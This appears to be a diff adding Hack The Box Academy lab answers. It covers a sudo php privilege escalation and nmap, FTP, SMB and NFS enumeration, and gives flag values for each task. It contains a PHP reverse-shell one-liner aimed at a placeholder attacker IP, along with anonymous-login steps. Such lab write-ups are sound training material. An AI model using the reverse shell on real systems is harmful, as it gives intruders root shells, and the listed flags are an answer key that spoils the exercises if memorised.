@@ -340,4 +340,304 @@ cat /home/mrb3n/user.txt
 
 **After obtaining a foothold on the target, escalate privileges to root and submit the contents of the root.txt flag.**
 
+Check out our permissions
 
+```
+sudo -l
+```
+
+Results:
+
+```
+Matching Defaults entries for www-data on gettingstarted:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on gettingstarted:
+    (ALL : ALL) NOPASSWD: /usr/bin/php
+
+```
+
+Grab a simple php reverse shell such as:
+
+```
+php -r '$sock=fsockopen("$AttackerIP",4444);exec("/bin/sh <&3 >&3 2>&3");'
+```
+
+Set up a netcat listener on port 4444:
+
+```
+nc -lnvp
+```
+
+
+Run as sudo:
+
+```
+sudo /usr/bin/php -r '$sock=fsockopen("$AttackerIP",4444);exec("/bin/sh <&3 >&3 2>&3");
+```
+
+You are root in the listener. Now
+
+```
+cat /root/root.txt
+```
+
+**Results**: f1fba6e9f71efb2630e6e34da6387842
+
+
+
+## NETWORK ENUMERATION WITH NMAP
+
+### Host Enumeration
+
+#### [Host Discovery](https://academy.hackthebox.com/module/19/section/101)
+
+**Based on the last result, find out which operating system it belongs to. Submit the name of the operating system as result.**
+
+
+```
+sudo nmap $ip -sn -oA host -PE --packet-trace --disable-arp-ping 
+```
+
+**Result**: Windows
+
+#### [Host and Port Scanning](https://academy.hackthebox.com/module/19/section/102)
+
+
+**Find all TCP ports on your target. Submit the total number of found TCP ports as the answer.**
+
+```
+nmap $ip
+```
+
+**Results**: 7
+
+
+**Enumerate the hostname of your target and submit it as the answer. (case-sensitive):**
+
+```
+sudo nmap $ip -Pn -sC -sV -p22,80,110,139,143,445,31337
+```
+
+**Results**: nix-nmap-default
+
+
+#### [Saving the Results](https://academy.hackthebox.com/module/19/section/104)
+
+ Perform a full TCP port scan on your target and create an HTML report. Submit the number of the highest port as the answer.
+
+```
+nmap $ip
+```
+
+Results: 31337
+
+
+#### [Service Enumeration](https://academy.hackthebox.com/module/19/section/103)
+
+Enumerate all ports and their services. One of the services contains the flag you have to submit as the answer.
+
+```
+sudo nmap $ip -Pn -sC -sV -p22,80,110,139,143,445,31337
+```
+
+Results: HTB{pr0F7pDv3r510nb4nn3r}
+
+
+#### [Nmap Scripting Engine](https://academy.hackthebox.com/module/19/section/108)
+
+**Use NSE and its scripts to find the flag that one of the services contain and submit it as the answer.**
+
+```
+sudo nmap $ip -p80 --script vuln
+```
+
+Result:
+
+```
+Pre-scan script results:
+| broadcast-avahi-dos: 
+|   Discovered hosts:
+|     224.0.0.251
+|   After NULL UDP avahi packet DoS (CVE-2011-1002).
+|_  Hosts are all up (not vulnerable).
+Nmap scan report for 10.129.68.164
+Host is up (0.047s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+| http-enum: 
+|_  /robots.txt: Robots file
+```
+
+Go to robots.txt and get the flag.
+
+Results: HTB{873nniuc71bu6usbs1i96as6dsv26}
+
+
+### Bypass Security Measures
+
+
+#### [Firewall and IDS/IPS Evasion - Easy Lab](https://academy.hackthebox.com/module/19/section/117)
+
+Our client wants to know if we can identify which operating system their provided machine is running on. Submit the OS name as the answer.
+
+```
+sudo nmap -sC -sV $ip -p80  -Pn --max-retries 3 --initial-rtt-timeout 50ms --max-rtt-timeout 100ms
+```
+
+Results: Ubuntu
+
+
+
+#### [Firewall and IDS/IPS Evasion - Medium Lab](https://academy.hackthebox.com/module/19/section/118)
+
+After the configurations are transferred to the system, our client wants to know if it is possible to find out our target's DNS server version. Submit the DNS server version of the target as the answer.
+
+```
+sudo nmap -sU -p53 --script dns-nsid $ip 
+```
+
+Results: HTB{GoTtgUnyze9Psw4vGjcuMpHRp}
+
+
+#### [Firewall and IDS/IPS Evasion - Hard Lab](https://academy.hackthebox.com/module/19/section/119)
+
+ Now our client wants to know if it is possible to find out the version of the running services. Identify the version of service our client was talking about and submit the flag as the answer.
+
+```
+sudo nc -nv -p 53 $ip  50000 
+```
+
+
+Results: HTB{kjnsdf2n982n1827eh76238s98di1w6}
+
+
+
+## NETWORK ENUMERATION WITH NMAP
+
+### FTP
+
+Which version of the FTP server is running on the target system? Submit the entire banner as the answer.
+
+```
+nc -nv $ip 21
+```
+
+Results: InFreight FTP v1.1
+
+
+Enumerate the FTP server and find the flag.txt file. Submit the contents of it as the answer.
+
+```
+ftp $ip
+```
+
+Enter user anonymous.
+
+Enter password anonymous.
+
+```
+ftp> dir
+ftp> get flag.txt
+ftp> quit
+
+cat flag.
+```
+
+Results: HTB{b7skjr4c76zhsds7fzhd4k3ujg7nhdjre}
+
+
+### SMB
+
+What version of the SMB server is running on the target system? Submit the entire banner as the answer.
+
+```
+sudo nmap $ip  -p445 -sV -A -sC
+```
+
+Results: Samba smbd 4.6.2
+
+
+ What is the name of the accessible share on the target?
+
+```
+ smbclient  -L //$ip 
+```
+
+Results: sambashare
+
+
+Connect to the discovered share and find the flag.txt file. Submit the contents as the answer.
+
+```
+smbclient  //$ip/sambashare -U ""
+dir
+cd contents
+ls
+get flag.txt
+quit
+cat flag.txt
+```
+
+Results: HTB{o873nz4xdo873n4zo873zn4fksuhldsf}
+
+
+Find out which domain the server belongs to.
+
+```
+rpcclient -U "" $ip
+rpcclient $> querydominfo
+```
+
+Results: DEVOPS
+
+Find additional information about the specific share we found previously and submit the customized version of that specific share as the answer.
+
+```
+rpcclient $> netsharegetinfo sambashare
+```
+
+Results: InFreight SMB v3.1
+
+
+
+What is the full system path of that specific share? (format: "/directory/names")
+
+```
+rpcclient $> netsharegetinfo sambashare
+```
+
+Results: /home/sambauser
+
+
+### NFS
+
+
+Enumerate the NFS service and submit the contents of the flag.txt in the "nfs" share as the answer.
+
+```
+sudo nmap $ip -p111,2049 -sV -sC
+showmount -e $ip 
+mkdir target 
+sudo mount -t nfs $ip:/ ./target -o nolock
+cd target 
+tree .
+cat var/nfs/flag.txt 
+```
+
+Results: HTB{hjglmvtkjhlkfuhgi734zthrie7rjmdze}
+
+
+
+Enumerate the NFS service and submit the contents of the flag.txt in the "nfsshare" share as the answer.
+
+```
+cat mnt/nfsshare/flag.txt 
+```
+
+Results: HTB{8o7435zhtuih7fztdrzuhdhkfjcn7ghi4357ndcthzuc7rtfghu34}
